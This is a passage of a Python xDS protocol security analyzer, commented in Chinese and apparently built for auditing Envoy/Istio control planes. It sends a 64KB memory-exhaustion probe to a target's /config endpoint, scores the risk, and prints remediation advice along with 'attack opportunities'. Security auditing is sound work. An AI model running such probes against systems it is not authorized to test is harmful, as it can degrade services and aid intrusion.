    async def _test_memory_exhaustion(self) -> Dict:
        """测试内存耗尽"""
        
        try:
            # 发送大payload
            large_payload = 'A' * 65536  # 64KB payload
            
            # 选择端口：优先发现的开放端口
            try_ports: List[int] = []
            try:
                hint = await self.discover_xds_endpoints()
                if hint.get('ports_open'):
                    try_ports = hint['ports_open']
            except Exception:
                pass
            if not try_ports:
                try_ports = [self.target_port]

            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target_host, try_ports[0]),
                timeout=self.timeout
            )
            
            request = (
                f"POST /config HTTP/1.1\r\n"
                f"Host: {self.target_host}:{try_ports[0]}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(large_payload)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{large_payload}"
            )
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=5.0)
            response_text = response.decode('utf-8', errors='ignore')
            
            writer.close()
            await writer.wait_closed()
            
            # 如果服务器处理了大payload，可能存在内存耗尽风险
            vulnerable = '200' in response_text or '413' not in response_text
            
            return {
                'vulnerable': vulnerable,
                'payload_size': len(large_payload),
                'response': response_text[:200]
            }
            
        except Exception as e:
            return {
                'vulnerable': False,
                'error': str(e)
            }
    
    def _generate_security_recommendations(self, analysis_results: Dict) -> List[str]:
        """生成安全建议"""
        
        recommendations = []
        
        # 基于发现的问题生成建议
        discovery = analysis_results.get('discovery_results', {})
        vulnerability = analysis_results.get('vulnerability_assessment', {})
        attacks = analysis_results.get('attack_scenarios', {})
        
        # 访问控制建议
        if discovery.get('accessible_interfaces'):
            recommendations.append("Implement proper authentication for admin interfaces")
        
        # 配置安全建议
        unauth_access = vulnerability.get('unauthorized_access', {})
        if unauth_access.get('admin_accessible'):
            recommendations.append("Restrict admin interface access to authorized networks only")
        
        # 注入防护建议
        config_injection = vulnerability.get('config_injection', {})
        if config_injection.get('vulnerable'):
            recommendations.append("Implement strict input validation for configuration endpoints")
        
        # 信息泄露防护
        config_disclosure = vulnerability.get('configuration_disclosure', {})
        if config_disclosure.get('sensitive_info_exposed'):
            recommendations.append("Remove sensitive information from accessible configuration dumps")
        
        # 协议安全建议
        communication = analysis_results.get('communication_analysis', {})
        protocol_versions = communication.get('protocol_versions', {})
        if protocol_versions.get('v2_detected') and not protocol_versions.get('v3_detected'):
            recommendations.append("Upgrade to xDS v3 API for improved security features")
        
        # 资源保护建议
        resource_exhaustion = attacks.get('resource_exhaustion', {})
        if resource_exhaustion.get('connection_exhaustion'):
            recommendations.append("Implement connection rate limiting and resource quotas")
        
        # 核心增强：Wasm攻击面建议
        if hasattr(self, 'wasm_analysis') and self.wasm_analysis:
            wasm_data = self.wasm_analysis
            if wasm_data.get('wasm_detected'):
                attack_surface = wasm_data.get('attack_surface_analysis', {})
                risk_level = attack_surface.get('risk_level', 'LOW')
                
                if risk_level in ['CRITICAL', 'HIGH']:
                    recommendations.insert(0, f"CRITICAL: Wasm plugins detected with {risk_level} risk - immediate security review required")
                
                # 基于Wasm源类型的建议
                wasm_sources = wasm_data.get('wasm_sources', [])
                for source in wasm_sources:
                    if source['type'] == 'remote_url':
                        recommendations.append("Audit remote Wasm module integrity and authenticity")
                    elif source['type'] == 'inline_code':
                        recommendations.append("Review inline Wasm code for security vulnerabilities")
                
                # Wasm专用安全建议
                recommendations.extend([
                    "Implement strict Wasm runtime sandboxing",
                    "Monitor Wasm plugin execution for anomalous behavior",
                    "Regular security audits of custom Wasm modules"
                ])
        
        # 通用安全建议
        recommendations.extend([
            "Enable TLS for all xDS communications",
            "Implement proper RBAC for configuration management",
            "Monitor xDS traffic for anomalous patterns",
            "Regular security audits of xDS configuration"
        ])
        
        return recommendations[:12]  # 扩展到12个建议以包含Wasm相关内容
    
    def _calculate_risk_assessment(self, analysis_results: Dict) -> Dict:
        """计算风险评估"""
        
        risk_score = 0
        risk_factors = []
        
        # 访问控制风险
        discovery = analysis_results.get('discovery_results', {})
        if discovery.get('accessible_interfaces'):
            risk_score += 30
            risk_factors.append("Admin interfaces accessible without authentication")
        
        # 配置漏洞风险
        vulnerability = analysis_results.get('vulnerability_assessment', {})
        
        config_injection = vulnerability.get('config_injection', {})
        if config_injection.get('vulnerable'):
            risk_score += 40
            risk_factors.append("Configuration injection vulnerabilities detected")
        
        config_disclosure = vulnerability.get('configuration_disclosure', {})
        if config_disclosure.get('sensitive_info_exposed'):
            risk_score += 25
            risk_factors.append("Sensitive configuration information exposed")
        
        # 攻击场景风险
        attacks = analysis_results.get('attack_scenarios', {})
        
        spoofing = attacks.get('control_plane_spoofing', {})
        if spoofing.get('spoofing_possible'):
            risk_score += 35
            risk_factors.append("Control plane spoofing attacks possible")
        
        resource_exhaustion = attacks.get('resource_exhaustion', {})
        if resource_exhaustion.get('connection_exhaustion'):
            risk_score += 20
            risk_factors.append("Resource exhaustion attacks successful")
        
        # 核心增强：Wasm攻击面风险
        if hasattr(self, 'wasm_analysis') and self.wasm_analysis:
            wasm_data = self.wasm_analysis
            if wasm_data.get('wasm_detected'):
                attack_surface = wasm_data.get('attack_surface_analysis', {})
                wasm_risk_score = attack_surface.get('risk_score', 0)
                
                if wasm_risk_score >= 60:
                    risk_score += 45  # Wasm高风险大幅提升总体风险
                    risk_factors.append("Critical Wasm plugin vulnerabilities detected")
                elif wasm_risk_score >= 30:
                    risk_score += 25
                    risk_factors.append("Medium-risk Wasm plugins identified")
                elif wasm_risk_score > 0:
                    risk_score += 15
                    risk_factors.append("Wasm attack surface present")
                
                # 远程Wasm模块特别风险
                wasm_sources = wasm_data.get('wasm_sources', [])
                remote_modules = [s for s in wasm_sources if s['type'] == 'remote_url']
                if remote_modules:
                    risk_score += 20
                    risk_factors.append(f"Remote Wasm modules detected: {len(remote_modules)} sources")
        
        # 确定风险等级
        if risk_score >= 80:
            risk_level = "CRITICAL"
        elif risk_score >= 60:
            risk_level = "HIGH"
        elif risk_score >= 40:
            risk_level = "MEDIUM"
        elif risk_score >= 20:
            risk_level = "LOW"
        else:
            risk_level = "MINIMAL"
        
        return {
            'risk_score': risk_score,
            'risk_level': risk_level,
            'risk_factors': risk_factors,
            'total_vulnerabilities': len(risk_factors),
            'assessment_summary': f"Risk Level: {risk_level} - Score: {risk_score}/100"
        }


# CLI接口
async def selftest(target="127.0.0.1", timeout=3.0, verbose=True):
    """xds_protocol_analyzer模块自检"""
    if verbose:
        print("[*] xds_protocol_analyzer selftest starting...")
    
    try:
        # 基础功能测试
        analyzer = XDSProtocolAnalyzer(target, 15000, timeout=timeout)
        
        # 测试xDS协议分析
        if verbose:
            print("  [+] Testing xDS protocol analysis...")
        result = await analyzer.comprehensive_xds_analysis()
        
        if verbose:
            print("  [+] xds_protocol_analyzer selftest completed successfully")
        return True
        
    except Exception as e:
        if verbose:
            print(f"  [-] xds_protocol_analyzer selftest failed: {e}")
        return False

async def main():
    import argparse
    import sys
    
    parser = argparse.ArgumentParser(description='xDS Protocol Security Analyzer')
    parser.add_argument('--selftest', action='store_true', help='Run module self-test')
    parser.add_argument('--target', default='127.0.0.1', help='Target hostname (for selftest)')
    parser.add_argument('host', nargs='?', help='Target hostname (for analysis)')
    parser.add_argument('--port', type=int, default=15000, help='Primary xDS port (default: 15000)')
    parser.add_argument('--timeout', type=float, default=5.0, help='Timeout seconds')

    # TLS/mTLS 验证选项
    parser.add_argument('--ads-validate', action='store_true', help='Validate ADS over TLS/mTLS and print handshake/session summary')
    parser.add_argument('--use-tls', action='store_true', help='Use TLS for ADS validation (default insecure unless specified)')
    parser.add_argument('--ca', help='CA certificate file path or inline PEM for server verification')
    parser.add_argument('--cert', help='Client certificate file path for mTLS')
    parser.add_argument('--key', help='Client private key file path for mTLS')
    parser.add_argument('--sni', help='TLS SNI/server_name override for TLS handshake')

    args = parser.parse_args()
    
    if args.selftest:
        try:
            result = await selftest(args.target, args.timeout)
            sys.exit(0 if result else 1)
        except KeyboardInterrupt:
            print("\n[!] Selftest interrupted")
            sys.exit(1)
        return
    
    if not args.host:
        parser.error("host argument is required when not using --selftest")
    
    # TLS/mTLS ADS 专用验证
    if args.ads_validate:
        analyzer = XDSProtocolAnalyzer(args.host, args.port, args.timeout)
        print("[*] Probing ADS transport requirements...")
        probe = await analyzer.tls_requirements_probe(ca_cert=args.ca, client_cert=args.cert, client_key=args.key, server_name=args.sni)
        print(json.dumps({'requirements': probe}, indent=2))
        print("[*] Validating ADS session over requested transport...")
        session = await analyzer.validate_ads_tls_session(use_tls=args.use_tls, ca_cert=args.ca, client_cert=args.cert, client_key=args.key, server_name=args.sni, duration_sec=3.0)
        print(json.dumps(session, indent=2, default=str))
        return

    print(f"[*] Starting xDS Protocol Security Analysis for {args.host}:{args.port}")
    print(f"[*] Based on insights from IngressNightmare research")
    print(f"="*60)
    
    # 创建分析器
    analyzer = XDSProtocolAnalyzer(args.host, args.port, args.timeout)
    
    # 执行分析
    results = await analyzer.comprehensive_xds_analysis()
    
    # 显示结果
    if 'error' in results:
        print(f"[-] Analysis failed: {results['error']}")
        if 'partial_results' in results:
            print(f"[*] Partial results available")
    else:
        print(f"[+] Analysis completed successfully")
        
        # 显示风险评估
        risk_assessment = results.get('risk_assessment', {})
        if risk_assessment:
            print(f"\n[RISK ASSESSMENT]")
            print(f"Risk Level: {risk_assessment.get('risk_level', 'Unknown')}")
            print(f"Risk Score: {risk_assessment.get('risk_score', 0)}/100")
            print(f"Total Vulnerabilities: {risk_assessment.get('total_vulnerabilities', 0)}")
        
        # 显示Wasm攻击面发现
        communication_analysis = results.get('communication_analysis', {})
        config_types = communication_analysis.get('configuration_types', [])
        if 'WASM_PLUGINS' in config_types:
            print(f"\n[WASM ATTACK SURFACE DETECTED]")
            print(f"Modern cloud-native Wasm plugins identified - new attack vectors available")
            
            # 如果分析器有Wasm分析结果，显示详细信息
            if hasattr(analyzer, 'wasm_analysis') and analyzer.wasm_analysis:
                wasm_data = analyzer.wasm_analysis
                attack_surface = wasm_data.get('attack_surface_analysis', {})
                
                print(f"Plugin Count: {wasm_data.get('plugin_count', 0)}")
                print(f"Risk Level: {attack_surface.get('risk_level', 'Unknown')}")
                print(f"Module Sources: {len(wasm_data.get('wasm_sources', []))}")
                
                # 显示深度Wasm运行时分析结果
                deep_analysis = wasm_data.get('deep_runtime_analysis')
                if deep_analysis:
                    print(f"\n[DEEP WASM RUNTIME ANALYSIS]")
                    print(f"Runtime Type: {deep_analysis.get('runtime_type', 'Unknown')}")
                    print(f"Security Score: {deep_analysis.get('security_score', 0)}/100")
                    print(f"Risk Level: {deep_analysis.get('risk_level', 'Unknown')}")
                    print(f"Plugins Discovered: {deep_analysis.get('plugins_discovered', 0)}")
                    print(f"Sandbox Escapes: {deep_analysis.get('sandbox_escapes', 0)}")
                    
                    # 显示关键漏洞
                    critical_vulns = deep_analysis.get('critical_vulnerabilities', [])
                    if critical_vulns:
                        print(f"Critical Vulnerabilities:")
                        for vuln in critical_vulns[:3]:
                            print(f"  - {vuln}")
                    
                    # 显示内存安全状态
                    memory_vulns = deep_analysis.get('memory_vulnerabilities', {})
                    if memory_vulns:
                        buffer_protection = memory_vulns.get('buffer_overflow_protection', 'Unknown')
                        print(f"Buffer Protection: {buffer_protection}")
                        if memory_vulns.get('use_after_free_detected'):
                            print(f"  ! Use-after-free vulnerabilities detected")
                        if memory_vulns.get('memory_leaks_suspected'):
                            print(f"  ! Memory leaks suspected")
                
                # 显示立即可执行的攻击机会
                immediate_opps = attack_surface.get('immediate_opportunities', [])
                if immediate_opps:
                    print(f"Immediate Attack Opportunities:")
                    for opp in immediate_opps[:3]:
                        print(f"  - {opp}")
        
        # 显示安全建议
        recommendations = results.get('security_recommendations', [])
        if recommendations:
            print(f"\n[SECURITY RECOMMENDATIONS]")
            for i, rec in enumerate(recommendations[:5], 1):
                print(f"{i}. {rec}")
        
        print(f"\n[*] Detailed results saved to analysis output")


if __name__ == "__main__":
    asyncio.run(main())